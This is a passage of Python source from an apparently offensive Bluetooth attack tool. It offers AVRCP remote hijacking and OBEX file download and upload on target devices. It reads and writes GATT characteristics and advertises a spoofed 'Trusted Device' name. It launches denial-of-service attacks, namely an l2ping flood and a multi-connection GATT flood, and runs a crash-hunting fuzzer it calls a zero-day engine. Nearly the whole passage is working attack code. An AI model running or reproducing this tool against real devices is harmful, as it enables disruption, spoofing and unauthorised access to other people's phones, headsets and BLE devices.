            mp3_file = pcap_file.replace(".pcap", ".mp3")
            print(f"{Fore.YELLOW}[*] Attempting to extract audio from pcap using gr-bluetooth...")
            output = self.run_cmd(f"gr-bluetooth -f {pcap_file} -o {mp3_file}", check_output=False, timeout=120)
            
            if os.path.exists(mp3_file) and os.path.getsize(mp3_file) > 0:
                print(f"{Fore.GREEN}[+] Audio file saved: {mp3_file}")
                print(f"{Fore.YELLOW}[*] To play: ffplay {mp3_file}")
            else:
                print(f"{Fore.RED}[!] Audio conversion failed or resulting file is empty.")
                print(f"{Fore.YELLOW}  Conversion output: {output}")
        except Exception as e:
            print(f"{Fore.RED}[!] Conversion error: {str(e)}")
    
    def stop_recording(self):
        """Stops the background recording process if active."""
        if self.recording_process and self.recording_process.poll() is None:
            os.killpg(os.getpgid(self.recording_process.pid), signal.SIGTERM)
            print(f"\n{Fore.GREEN}[+] Recording process terminated.")
            self.recording_process = None
        else:
            pass

    def avrcp_hijacking(self):
        print(f"\n{Fore.RED}[*] Starting AVRCP Remote Hijacking...")
        
        if "AVRCP" not in self.current_target.get('services_sdp', '') and "Remote Control" not in self.current_target.get('services_sdp', ''):
            print(f"{Fore.RED}[!] AVRCP service not detected on target. Cannot proceed.")
            return

        print(f"{Fore.CYAN}┌─────────────────[ AVRCP COMMANDS ]─────────────────┐")
        print(f"│ {Fore.YELLOW}1. Play                                     {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}2. Pause                                    {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}3. Stop                                     {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}4. Volume Up                                {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}5. Volume Down                              {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}6. Next Track                               {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}7. Previous Track                           {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}8. Back                                     {Fore.CYAN}│")
        print(f"└─────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        
        choice = input(f"{Fore.GREEN}[>] Select command: ")
        
        commands = {
            '1': 'play', '2': 'pause', '3': 'stop',
            '4': 'volume up', '5': 'volume down',
            '6': 'next', '7': 'previous'
        }
        
        if choice in commands:
            self.send_avrcp_command(commands[choice])
        elif choice == '8':
            return
        else:
            print(f"{Fore.RED}[!] Invalid selection")
    
    def send_avrcp_command(self, command):
        try:
            device_dbus_path = self.adapter_path.replace('/org/bluez', '') + f"/dev_{self.current_target['mac'].replace(':', '_')}"
            
            bus = dbus.SystemBus()
            obj = bus.get_object('org.bluez', device_dbus_path)
            media_control = dbus.Interface(obj, 'org.bluez.MediaControl1')

            if command == 'play': media_control.Play()
            elif command == 'pause': media_control.Pause()
            elif command == 'stop': media_control.Stop()
            elif command == 'volume up': media_control.VolumeUp()
            elif command == 'volume down': media_control.VolumeDown()
            elif command == 'next': media_control.Next()
            elif command == 'previous': media_control.Previous()
            
            print(f"{Fore.GREEN}[+] {command.capitalize()} command sent successfully to {self.current_target['name']}")
        except dbus.exceptions.DBusException as e:
            print(f"{Fore.RED}[!] D-Bus command failed: {str(e)}")
            print(f"{Fore.YELLOW}[*] Ensure the target device is connected and supports AVRCP MediaControl1 interface.")
        except Exception as e:
            print(f"{Fore.RED}[!] Command failed: {str(e)}")
    
    def obex_operations(self):
        print(f"\n{Fore.RED}[*] Starting OBEX File Operations...")
        
        if "OBEX Object Push" not in self.current_target.get('services_sdp', '') and "File Transfer" not in self.current_target.get('services_sdp', ''):
            print(f"{Fore.RED}[!] OBEX service not detected on target. Cannot proceed.")
            return

        try:
            print(f"{Fore.YELLOW}[*] Attempting to connect to OBEX service on {self.current_target['mac']}...")
            client = Client(self.current_target['mac'], 9)
            client.connect()
            
            print(f"{Fore.GREEN}[+] Connected to OBEX service.")
            
            print(f"{Fore.CYAN}[*] Listing available files (may be limited by target permissions):")
            files = client.listdir()
            if files:
                for file_item in files:
                    print(f"  - {file_item}")
            else:
                print(f"  {Fore.YELLOW}No files found or access denied.{Style.RESET_ALL}")
            
            filename_to_download = input(f"{Fore.GREEN}[>] Enter filename to download (or leave blank): ").strip()
            if filename_to_download:
                target_path = os.path.join(self.downloads_dir, filename_to_download)
                print(f"{Fore.YELLOW}[*] Downloading {filename_to_download} to {target_path}...")
                try:
                    client.get(filename_to_download, target_path)
                    print(f"{Fore.GREEN}[+] File downloaded to {target_path}")
                except Exception as e:
                    print(f"{Fore.RED}[!] Download failed: {str(e)}")
            
            local_file_to_upload = input(f"{Fore.GREEN}[>] Enter local filename to upload (or leave blank): ").strip()
            if local_file_to_upload:
                if os.path.exists(local_file_to_upload):
                    remote_filename = os.path.basename(local_file_to_upload)
                    print(f"{Fore.YELLOW}[*] Uploading {local_file_to_upload} as {remote_filename}...")
                    try:
                        client.put(local_file_to_upload, remote_filename)
                        print(f"{Fore.GREEN}[+] File uploaded successfully.")
                    except Exception as e:
                        print(f"{Fore.RED}[!] Upload failed: {str(e)}")
                else:
                    print(f"{Fore.RED}[!] Local file not found: {local_file_to_upload}")
            
            client.disconnect()
            
        except Exception as e:
            print(f"{Fore.RED}[!] OBEX operation failed: {str(e)}")
            print(f"{Fore.YELLOW}[*] Ensure OBEX service is active and discoverable on target, and target is paired if required.")
    
    async def ble_exploitation(self):
        if self.current_target['type'] not in ['BLE', 'Dual-Mode']:
            print(f"{Fore.RED}[!] This option is for BLE or Dual-Mode devices only.")
            return
        
        if not self.current_target.get('gatt_services'):
            print(f"{Fore.YELLOW}[*] Running GATT service scan first...")
            self.current_target['gatt_services'] = await self.scan_gatt_services(self.current_target['mac'])
            if not self.current_target['gatt_services']:
                print(f"{Fore.RED}[!] No GATT services found. Cannot proceed with BLE exploitation.")
                return

        while True:
            print(f"\n{Fore.CYAN}┌──────────[ BLE EXPLOITATION: {self.current_target['mac']} ]──────────┐")
            print(f"│ {Fore.YELLOW}1. Read/Write GATT Characteristics         {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}2. Subscribe to Notifications/Indications  {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}3. Back to exploitation menu               {Fore.CYAN}│")
            print(f"└───────────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
            
            choice = input(f"{Fore.GREEN}[>] Select BLE exploit: ")
            
            if choice == '1':
                await self.read_write_gatt_characteristics()
            elif choice == '2':
                await self.subscribe_to_ble_notifications()
            elif choice == '3':
                break
            else:
                print(f"{Fore.RED}[!] Invalid selection")

    async def read_write_gatt_characteristics(self):
        """قراءة وكتابة خصائص GATT"""
        mac = self.current_target['mac']
        if not self.current_target.get('gatt_services'):
            print(f"{Fore.RED}[!] No GATT services found to interact with. Run 'Advanced vulnerability assessment' first.")
            return

        print(f"\n{Fore.YELLOW}[*] Available GATT characteristics for {mac}:")
        writable_chars = []
        for s_uuid, s_data in self.current_target['gatt_services'].items():
            print(f"{Fore.CYAN}  Service: {s_uuid} ({s_data['description']})")
            for c_uuid, c_data in s_data['characteristics'].items():
                props = c_data['properties']
                is_writable = "write" in props or "write-without-response" in props
                
                print(f"{Fore.BLUE}    Char: {c_uuid} (Properties: {', '.join(props)}) {'(Writable)' if is_writable else ''}")
                if "read" in props:
                    print(f"      Current Value: {c_data['value']}")
                if is_writable:
                    writable_chars.append(c_uuid)

        if not writable_chars:
            print(f"{Fore.YELLOW}[!] No writable characteristics found for {mac}.")
            return

        char_uuid_to_interact = input(f"{Fore.GREEN}[>] Enter UUID of characteristic to Read/Write: ").strip()
        if not char_uuid_to_interact:
            print(f"{Fore.YELLOW}[-] No characteristic selected.")
            return

        target_char = None
        for s_data in self.current_target['gatt_services'].values():
            if char_uuid_to_interact in s_data['characteristics']:
                target_char = s_data['characteristics'][char_uuid_to_interact]
                break

        if not target_char:
            print(f"{Fore.RED}[!] Characteristic UUID not found in scanned services.")
            return

        try:
            client = BleakClient(mac, adapter=self.hci_adapter)
            await client.connect()

            if "read" in target_char['properties']:
                print(f"{Fore.YELLOW}[*] Attempting to read characteristic {char_uuid_to_interact}...")
                value_bytes = await client.read_gatt_char(char_uuid_to_interact)
                value_str = value_bytes.decode('utf-8', errors='ignore').strip() or binascii.hexlify(value_bytes).decode('ascii')
                print(f"{Fore.GREEN}[+] Read successful: {value_str}")
            else:
                print(f"{Fore.YELLOW}[-] Characteristic is not readable.")

            if "write" in target_char['properties'] or "write-without-response" in target_char['properties']:
                write_value = input(f"{Fore.GREEN}[>] Enter value to write (hex bytes or string): ").strip()
                if write_value:
                    try:
                        if re.match(r'^[0-9a-fA-F\s]+$', write_value.replace(' ', '')):
                            value_to_write = binascii.unhexlify(write_value.replace(' ', ''))
                        else:
                            value_to_write = write_value.encode('utf-8')
                        
                        print(f"{Fore.YELLOW}[*] Attempting to write '{write_value}' to characteristic {char_uuid_to_interact}...")
                        await client.write_gatt_char(char_uuid_to_interact, value_to_write, response=True)
                        print(f"{Fore.GREEN}[+] Write successful.")
                    except Exception as e:
                        print(f"{Fore.RED}[!] Write failed: {str(e)}")
                else:
                    print(f"{Fore.YELLOW}[-] No value provided for writing.")
            else:
                print(f"{Fore.YELLOW}[-] Characteristic is not writable.")
            
            await client.disconnect()

        except Exception as e:
            print(f"{Fore.RED}[!] Failed to connect or interact with GATT: {str(e)}")

    async def subscribe_to_ble_notifications(self):
        mac = self.current_target['mac']
        if not self.current_target.get('gatt_services'):
            print(f"{Fore.RED}[!] No GATT services found to subscribe to. Run 'Advanced vulnerability assessment' first.")
            return

        print(f"\n{Fore.YELLOW}[*] Available GATT characteristics with Notify/Indicate properties for {mac}:")
        notifiable_chars = {}
        for s_uuid, s_data in self.current_target['gatt_services'].items():
            for c_uuid, c_data in s_data['characteristics'].items():
                props = c_data['properties']
                if "notify" in props or "indicate" in props:
                    notifiable_chars[c_uuid] = s_data['description']
                    print(f"{Fore.CYAN}  Char: {c_uuid} (Service: {s_uuid} - {s_data['description']}) (Properties: {', '.join(props)})")

        if not notifiable_chars:
            print(f"{Fore.YELLOW}[!] No notifiable/indicatable characteristics found for {mac}.")
            return

        char_uuid_to_subscribe = input(f"{Fore.GREEN}[>] Enter UUID of characteristic to subscribe to (or 'all' to try all): ").strip()

        def notification_handler(sender_uuid, data_bytes):
            print(f"\n{Fore.MAGENTA}[NOTIFICATION from {sender_uuid}]: {data_bytes.decode('utf-8', errors='ignore').strip() or binascii.hexlify(data_bytes).decode('ascii')}")

        try:
            client = BleakClient(mac, adapter=self.hci_adapter)
            await client.connect()
            print(f"{Fore.GREEN}[+] Connected to BLE device for subscriptions.")

            if char_uuid_to_subscribe.lower() == 'all':
                for c_uuid in notifiable_chars.keys():
                    print(f"{Fore.YELLOW}[*] Subscribing to all notifiable characteristics: {c_uuid}...")
                    try:
                        await client.start_notify(c_uuid, notification_handler)
                        print(f"{Fore.GREEN}[+] Subscribed to {c_uuid}")
                    except Exception as e:
                        print(f"{Fore.RED}[!] Failed to subscribe to {c_uuid}: {str(e)}")
            elif char_uuid_to_subscribe in notifiable_chars:
                print(f"{Fore.YELLOW}[*] Subscribing to {char_uuid_to_subscribe}...")
                await client.start_notify(char_uuid_to_subscribe, notification_handler)
                print(f"{Fore.GREEN}[+] Subscribed to {char_uuid_to_subscribe}")
            else:
                print(f"{Fore.RED}[!] Invalid characteristic UUID or not notifiable.")
                await client.disconnect()
                return

            print(f"{Fore.YELLOW}[*] Listening for notifications. Press Enter to stop and disconnect...")
            input()
            
            if char_uuid_to_subscribe.lower() == 'all':
                for c_uuid in notifiable_chars.keys():
                    try:
                        await client.stop_notify(c_uuid)
                    except:
                        pass 
            elif char_uuid_to_subscribe in notifiable_chars:
                await client.stop_notify(char_uuid_to_subscribe)

            await client.disconnect()
            print(f"{Fore.GREEN}[+] Disconnected from BLE device.")

        except Exception as e:
            print(f"{Fore.RED}[!] Failed to connect or subscribe: {str(e)}")
    
    async def ble_address_spoofing(self):
        """BLE Address Spoofing D-Bus LEAdvertisingManager1"""
        print(f"\n{Fore.RED}[*] Starting BLE Address Spoofing (via D-Bus LEAdvertisingManager1)...")
        
        spoof_name = input(f"{Fore.GREEN}[>] Enter device name to advertise (e.g., 'Trusted Device'): ").strip()
        
        if not spoof_name:
            print(f"{Fore.RED}[!] Device name is required for advertising.")
            return

        try:
            bus = dbus.SystemBus()
            adapter_obj = bus.get_object('org.bluez', self.adapter_path)
            adv_mgr = dbus.Interface(adapter_obj, 'org.bluez.LEAdvertisingManager1')

            self.run_cmd(f"bluetoothctl -a discoverable on")
            self.run_cmd(f"bluetoothctl -a pairable on")
            self.run_cmd(f"bluetoothctl -a alias \"{spoof_name}\"")
            
            print(f"{Fore.GREEN}[+] Advertising spoofed device '{spoof_name}' on {self.hci_adapter}. Your adapter's MAC address will be used.")
            print(f"{Fore.YELLOW}[*] Check with another device's BLE scan. Press Enter to stop spoofing.")
            input()
            
            self.run_cmd(f"bluetoothctl -a discoverable off")
            self.run_cmd(f"bluetoothctl -a pairable off")
            print(f"{Fore.GREEN}[+] Spoofing stopped.")

        except dbus.exceptions.DBusException as e:
            print(f"{Fore.RED}[!] D-Bus advertising failed: {str(e)}")
            print(f"{Fore.YELLOW}[*] Ensure BlueZ version supports LEAdvertisingManager1 (BlueZ 5.43+).")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to initiate BLE Address Spoofing: {str(e)}")

    async def dos_attack(self):
        print(f"\n{Fore.RED}[*] Launching DoS Attack on {self.current_target['mac']}...")
        
        print(f"{Fore.CYAN}┌─────────────────[ DoS ATTACK TYPES ]─────────────────┐")
        print(f"│ {Fore.YELLOW}1. L2CAP Flood (General Classic BT DoS)     {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}2. GATT Service Flood (BLE DoS)             {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}3. Back                                     {Fore.CYAN}│")
        print(f"└─────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        
        choice = input(f"{Fore.GREEN}[>] Select DoS type: ")
        
        if choice == '1':
            print(f"{Fore.YELLOW}[*] Flooding with L2CAP packets on {self.hci_adapter}...")
            try:
                self.sniffing_process = self.run_cmd(f"l2ping -i {self.hci_adapter} -s 65528 -f {self.current_target['mac']}", background=True, check_output=False)
                print(f"{Fore.RED}[!] L2CAP Flood launched in background. Device may freeze/disconnect.")
                print(f"{Fore.YELLOW}[*] Press Enter to stop attack.")
                input()
                self.stop_sniffing()
                print(f"{Fore.GREEN}[+] L2CAP Flood stopped.")
            except Exception as e:
                print(f"{Fore.RED}[!] Failed to launch L2CAP Flood: {e}")
        elif choice == '2':
            if self.current_target['type'] not in ['BLE', 'Dual-Mode']:
                print(f"{Fore.RED}[!] GATT Service Flood is for BLE/Dual-Mode devices only.")
                return
            await self._gatt_service_flood(self.current_target['mac'])
        elif choice == '3':
            return
        else:
            print(f"{Fore.RED}[!] Invalid selection")
    
    async def _gatt_service_flood(self, mac, num_connections=5):
        """Floods GATT services with read/write requests (BLE DoS)"""
        print(f"\n{Fore.RED}[*] Starting GATT Service Flood on {mac}...")
        print(f"{Fore.YELLOW}[*] Attempting to open {num_connections} connections and flood GATT characteristics.")

        if not self.current_target.get('gatt_services'):
            print(f"{Fore.YELLOW}[*] Running GATT service scan first...")
            self.current_target['gatt_services'] = await self.scan_gatt_services(mac)
            if not self.current_target['gatt_services']:
                print(f"{Fore.RED}[!] No GATT services found. Cannot flood.")
                return

        writable_chars = []
        for s_data in self.current_target['gatt_services'].values():
            for c_uuid, c_data in s_data['characteristics'].items():
                if "read" in c_data['properties'] or "write" in c_data['properties'] or "write-without-response" in c_data['properties']:
                    writable_chars.append(c_uuid)
        
        if not writable_chars:
            print(f"{Fore.YELLOW}[!] No readable/writable characteristics found for flooding.")
            return

        async def flood_client_task(client_id):
            client = None
            try:
                client = BleakClient(mac, adapter=self.hci_adapter, timeout=10)
                await client.connect()
                print(f"{Fore.CYAN}  [+] Client {client_id}: Connected to {mac}")
                
                while True:
                    char_to_flood = random.choice(writable_chars)
                    try:
                        if "write" in self.current_target['gatt_services'][list(self.current_target['gatt_services'].keys())[0]]['characteristics'][char_to_flood]['properties'] or \
                           "write-without-response" in self.current_target['gatt_services'][list(self.current_target['gatt_services'].keys())[0]]['characteristics'][char_to_flood]['properties']:
                             await client.write_gatt_char(char_to_flood, b'\x00' * random.randint(1, 20), response=False)
                        elif "read" in self.current_target['gatt_services'][list(self.current_target['gatt_services'].keys())[0]]['characteristics'][char_to_flood]['properties']:
                            await client.read_gatt_char(char_to_flood)
                    except Exception as e:
                        pass
                    await asyncio.sleep(0.001)

            except Exception as e:
                print(f"{Fore.RED}  [!] Client {client_id} connection/flood failed: {str(e)}")
            finally:
                if client and client.is_connected:
                    await client.disconnect()
        
        flood_tasks = [asyncio.create_task(flood_client_task(i)) for i in range(num_connections)]
        
        print(f"{Fore.RED}[!] GATT Service Flood launched. Device performance may degrade or disconnect.")
        print(f"{Fore.YELLOW}[*] Press Enter to stop flood.")
        input()
        
        for task in flood_tasks:
            task.cancel()
        await asyncio.gather(*flood_tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] GATT Service Flood stopped.")

    def bluetooth_sniffing_menu(self):
        """Menu for Bluetooth sniffing and monitoring"""
        while True:
            print(f"\n{Fore.CYAN}┌──────────[ BLUETOOTH SNIFFING & MONITORING ]──────────┐")
            print(f"│ {Fore.YELLOW}1. Start Bluetooth Packet Sniffing (dumpcap){Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}2. Stop Sniffing                              {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}3. Open Last Capture in Wireshark             {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}4. Back to Main Menu                          {Fore.CYAN}│")
            print(f"└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")

            choice = input(f"{Fore.GREEN}[>] Select option: ")

            if choice == '1':
                self._start_bluetooth_sniffing()
            elif choice == '2':
                self.stop_sniffing()
            elif choice == '3':
                self._open_last_capture_in_wireshark()
            elif choice == '4':
                break
            else:
                print(f"{Fore.RED}[!] Invalid selection")

    def _start_bluetooth_sniffing(self):
        """Starts capturing Bluetooth traffic using dumpcap."""
        if self.sniffing_process and self.sniffing_process.poll() is None:
            print(f"{Fore.YELLOW}[!] Sniffing is already active. Stop it first (Option 2).")
            return

        output_file = os.path.join(self.logs_dir, f"bluetooth_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcapng")
        
        print(f"{Fore.YELLOW}[*] Starting Bluetooth packet capture on {self.hci_adapter}...")
        print(f"{Fore.YELLOW}[*] Output will be saved to: {output_file}")
        print(f"{Fore.CYAN}[*] This requires `dumpcap` (part of Wireshark) and root privileges.")
        
        try:
            adapter_id = re.search(r'\d+', self.hci_adapter)
            dumpcap_iface = f"bluetooth{adapter_id.group(0)}" if adapter_id else "any"

            cmd = f"dumpcap -i {dumpcap_iface} -w {output_file} -s 0 -q" 
            
            print(f"{Fore.YELLOW}[*] Executing: {cmd}")
            self.sniffing_process = self.run_cmd(cmd, background=True, check_output=False)
            self.last_capture_file = output_file
            
            print(f"{Fore.GREEN}[+] Sniffing started. Press Ctrl+C or use 'Stop Sniffing' option to stop.")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to start sniffing: {str(e)}")
            if self.sniffing_process:
                self.stop_sniffing()

    def stop_sniffing(self):
        """Stops the background sniffing process if active."""
        if self.sniffing_process and self.sniffing_process.poll() is None:
            os.killpg(os.getpgid(self.sniffing_process.pid), signal.SIGTERM)
            print(f"\n{Fore.GREEN}[+] Sniffing process terminated.")
            self.sniffing_process = None
        else:
            pass

    def _open_last_capture_in_wireshark(self):
        """Opens the last captured pcapng file in Wireshark."""
        if hasattr(self, 'last_capture_file') and os.path.exists(self.last_capture_file):
            print(f"{Fore.CYAN}[*] Opening {self.last_capture_file} in Wireshark...")
            try:
                subprocess.Popen(['wireshark', self.last_capture_file])
                print(f"{Fore.GREEN}[+] Wireshark launched. Analysis can begin.")
            except FileNotFoundError:
                print(f"{Fore.RED}[!] Wireshark not found. Please ensure it's installed and in your PATH.")
            except Exception as e:
                print(f"{Fore.RED}[!] Failed to open Wireshark: {str(e)}")
        else:
            print(f"{Fore.YELLOW}[!] No capture file found or created yet.")

    def save_scan_results(self):
        """حفظ نتائج المسح في ملف JSON"""
        filename = os.path.join(self.logs_dir, f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        try:
            with open(filename, 'w') as f:
                json.dump(self.devices, f, indent=4)
            print(f"{Fore.GREEN}[+] Scan results saved to {filename}")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to save scan results: {str(e)}")
    
    def save_vulnerability_report(self):
        """حفظ تقرير الثغرات في ملف JSON"""
        if not self.vulnerable_devices:
            return
            
        filename = os.path.join(self.logs_dir, f"vuln_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        try:
            with open(filename, 'w') as f:
                json.dump(self.vulnerable_devices, f, indent=4)
            print(f"{Fore.GREEN}[+] Vulnerability report saved to {filename}")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to save vulnerability report: {str(e)}")

    async def fuzzing_menu(self):
        """Main menu for the Zero-Day Fuzzing Engine."""
        if self.current_target['type'] not in ['BLE', 'Dual-Mode']:
            print(f"{Fore.RED}[!] Fuzzing currently supports BLE/Dual-Mode devices only (GATT Characteristics).")
            return
        
        if not self.current_target.get('gatt_services'):
            print(f"{Fore.YELLOW}[*] Running GATT service scan first for fuzzing targets...")
            self.current_target['gatt_services'] = await self.scan_gatt_services(self.current_target['mac'])
            if not self.current_target['gatt_services']:
                print(f"{Fore.RED}[!] No GATT services found. Cannot proceed with fuzzing.")
                return

        while True:
            print(f"\n{Fore.CYAN}┌──────────[ ZERO-DAY FUZZING ENGINE: {self.current_target['mac']} ]──────────┐")
            print(f"│ {Fore.YELLOW}1. Fuzz GATT Characteristics                {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}2. Back to exploitation menu                {Fore.CYAN}│")
            print(f"└──────────────────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")

            choice = input(f"{Fore.GREEN}[>] Select fuzzing target: ")

            if choice == '1':
                await self._gatt_fuzzing_options()
            elif choice == '2':
                break
            else:
                print(f"{Fore.RED}[!] Invalid selection")

    async def _gatt_fuzzing_options(self):
        """Sub-menu for GATT fuzzing options."""
        writable_chars = []
        for s_uuid, s_data in self.current_target['gatt_services'].items():
            for c_uuid, c_data in s_data['characteristics'].items():
                if "write" in c_data['properties'] or "write-without-response" in c_data['properties']:
                    writable_chars.append(c_uuid)
        
        if not writable_chars:
            print(f"{Fore.RED}[!] No writable GATT characteristics found on target. Cannot fuzz.")
            return

        print(f"\n{Fore.CYAN}┌──────────[ GATT FUZZING OPTIONS ]──────────┐")
        for i, char_uuid in enumerate(writable_chars, 1):
            print(f"│ {Fore.YELLOW}{i}. Fuzz Characteristic: {char_uuid} {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}A. Fuzz All Writable Characteristics       {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}B. Back                                    {Fore.CYAN}│")
        print(f"└───────────────────────────────────────────────┘{Style.RESET_ALL}")

        choice = input(f"{Fore.GREEN}[>] Select characteristic to fuzz (number or A/B): ").strip().upper()

        if choice == 'B':
            return
        
        fuzz_all = False
        target_char_uuids = []

        if choice == 'A':
            fuzz_all = True
            target_char_uuids = writable_chars
        else:
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(writable_chars):
                    target_char_uuids.append(writable_chars[idx])
                else:
                    print(f"{Fore.RED}[!] Invalid selection.")
                    return
            except ValueError:
                print(f"{Fore.RED}[!] Invalid input.")
                return

        fuzz_strategy = input(f"{Fore.GREEN}[>] Select Fuzzing Strategy (Dumb/Bit-Flip): ").strip().lower()
        if fuzz_strategy not in ['dumb', 'bit-flip']:
            print(f"{Fore.RED}[!] Invalid fuzzing strategy. Choose 'Dumb' or 'Bit-Flip'.")
            return
        
        max_fuzz_cases = int(input(f"{Fore.GREEN}[>] Enter max number of fuzz cases per characteristic (e.g., 5000): ") or 5000)

        for char_uuid in target_char_uuids:
            print(f"\n{Fore.MAGENTA}--- Starting Fuzzing for Characteristic: {char_uuid} ---")
            await self.run_gatt_fuzzer(char_uuid, fuzz_strategy, max_fuzz_cases)
            print(f"{Fore.MAGENTA}--- Fuzzing for {char_uuid} Complete ---")
            if not fuzz_all: break

    async def run_gatt_fuzzer(self, target_characteristic_uuid, strategy, max_fuzz_cases):
        """Executes the GATT characteristic fuzzing loop."""
        mac = self.current_target['mac']
        crash_detected = False
        last_fuzz_cases = []

        try:
            client = BleakClient(mac, adapter=self.hci_adapter)
            await client.connect(timeout=10)
            print(f"{Fore.GREEN}[+] Connected to BLE device for fuzzing.")

            target_char_props = None
            for s_data in self.current_target['gatt_services'].values():
                if target_characteristic_uuid in s_data['characteristics']:
                    target_char_props = s_data['characteristics'][target_characteristic_uuid]['properties']
                    break
            
            if not target_char_props or ("write" not in target_char_props and "write-without-response" not in target_char_props):
                print(f"{Fore.RED}[!] Characteristic {target_characteristic_uuid} is not writable. Cannot fuzz.")
                await client.disconnect()
                return

            base_input = b''
            if strategy == 'bit-flip':
                if "read" in target_char_props:
                    try:
                        base_input = await client.read_gatt_char(target_characteristic_uuid)
                        print(f"{Fore.YELLOW}[*] Bit-Flip Fuzzer: Using current characteristic value as base: {binascii.hexlify(base_input).decode('ascii')}")
                    except Exception as e:
                        print(f"{Fore.YELLOW}[!] Could not read base input for Bit-Flip: {e}. Using empty bytes.")
                        base_input = b'\x00'
                else:
                    base_input = b'\x00'

            for i in range(1, max_fuzz_cases + 1):
                sys.stdout.write(f"\r{Fore.YELLOW}Fuzzing Case #{i}/{max_fuzz_cases} for {target_characteristic_uuid}...")
                sys.stdout.flush()

                if strategy == 'dumb':
                    fuzz_data = self._generate_dumb_fuzz_case(max_length=512)
                elif strategy == 'bit-flip':
                    fuzz_data = self._generate_bitflip_fuzz_case(base_input, i)
                else:
                    print(f"{Fore.RED}[!] Unknown fuzzing strategy. Stopping.")
                    break

                last_fuzz_cases.append({"case_num": i, "data": binascii.hexlify(fuzz_data).decode('ascii')})
                if len(last_fuzz_cases) > 10:
                    last_fuzz_cases.pop(0)

                try:
                    await client.write_gatt_char(target_characteristic_uuid, fuzz_data, response=True)
                except Exception as e:
                    print(f"\n{Fore.RED}[!] Error writing fuzz data: {e}. Checking target health...")
                    crash_detected = True
                
                await asyncio.sleep(0.1)
                if not self.check_target_health(mac):
                    crash_detected = True
                    
                if crash_detected:
                    print(f"\n{Fore.RED}[!!!] POTENTIAL ZERO-DAY FOUND! [!!!]")
                    crash_info = {
                        "timestamp": datetime.now().isoformat(),
                        "target_mac": mac,
                        "targeted_characteristic": target_characteristic_uuid,
                        "fuzzing_strategy": strategy,
                        "fuzz_case_number": i,
                        "crashing_data_hex": binascii.hexlify(fuzz_data).decode('ascii'),
                        "last_10_fuzz_cases": last_fuzz_cases
                    }
                    self.save_crash_report(crash_info)
                    break
                
                if not client.is_connected:
                    print(f"\n{Fore.YELLOW}[*] Client disconnected, attempting to reconnect...")
                    try:
                        await client.connect(timeout=10)
                        print(f"{Fore.GREEN}[+] Reconnected.")
                    except Exception as e:
                        print(f"{Fore.RED}[!] Failed to reconnect: {e}. Assuming persistent issue or crash.")
                        crash_detected = True
                        break

            if not crash_detected:
                print(f"\n{Fore.GREEN}[+] Fuzzing completed without detected crashes for {target_characteristic_uuid}.")

        except Exception as e:
            print(f"\n{Fore.RED}[!] Fuzzing process encountered a critical error: {str(e)}")
        finally:
            if 'client' in locals() and client.is_connected:
                await client.disconnect()
            print(f"{Fore.YELLOW}[*] Fuzzing process finished for {target_characteristic_uuid}.")

    def _generate_dumb_fuzz_case(self, max_length=512):
        """Generates random byte strings for fuzzing."""
        length = random.randint(1, max_length)
        return os.urandom(length)

    def _generate_bitflip_fuzz_case(self, base_input, iteration):
        """Applies simple bit-flips and other mutations to a base input."""
        if not base_input:
            base_input = b'\x00'

        mutated_data = bytearray(base_input)
        
        if len(mutated_data) > 0:
            byte_index = random.randint(0, len(mutated_data) - 1)
            bit_index = random.randint(0, 7)
            mutated_data[byte_index] ^= (1 << bit_index)
        
        if random.random() < 0.2:
            mutated_data.insert(random.randint(0, len(mutated_data)), random.randint(0, 255))

        if random.random() < 0.1 and len(mutated_data) > 1:
            start = random.randint(0, len(mutated_data) - 1)
            end = random.randint(start + 1, len(mutated_data))
            mutated_data.extend(mutated_data[start:end])

        if random.random() < 0.1:
            if len(mutated_data) > 0:
                mutated_data[random.randint(0, len(mutated_data) - 1)] = random.choice([0x00, 0xFF, 0x7F, 0x80])

        return bytes(mutated_data)

    def check_target_health(self, mac):
        """Checks if the target device is still responsive using l2ping."""
        cmd = f"l2ping -i {self.hci_adapter} -c 1 -t 1 {mac}"
        output = self.run_cmd(cmd, check_output=False, timeout=2)
        
        if "0 received" in output or "Host is down" in output or "Can't connect" in output:
            print(f"\n{Fore.RED}[!] Health Check: Target {mac} is NOT RESPONSIVE!")
            return False
        
        if not output and "0 received" not in output:
             print(f"\n{Fore.RED}[!] Health Check: Target {mac} is NOT RESPONSIVE (l2ping failed unexpectedly)!")
             return False
        
        return True

    def save_crash_report(self, crash_data):
        """Saves a detailed crash report to a JSON file."""
        report_filename = os.path.join(self.crashes_dir, f"crash_report_{crash_data['target_mac'].replace(':', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        try:
            with open(report_filename, 'w') as f:
                json.dump(crash_data, f, indent=4)
            print(f"{Fore.GREEN}[+] Crash report saved to: {report_filename}")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to save crash report: {str(e)}")

    async def run(self):
        self.show_banner()
        await self.scan_devices()
        
        while True:
            choice = self.show_menu()
            
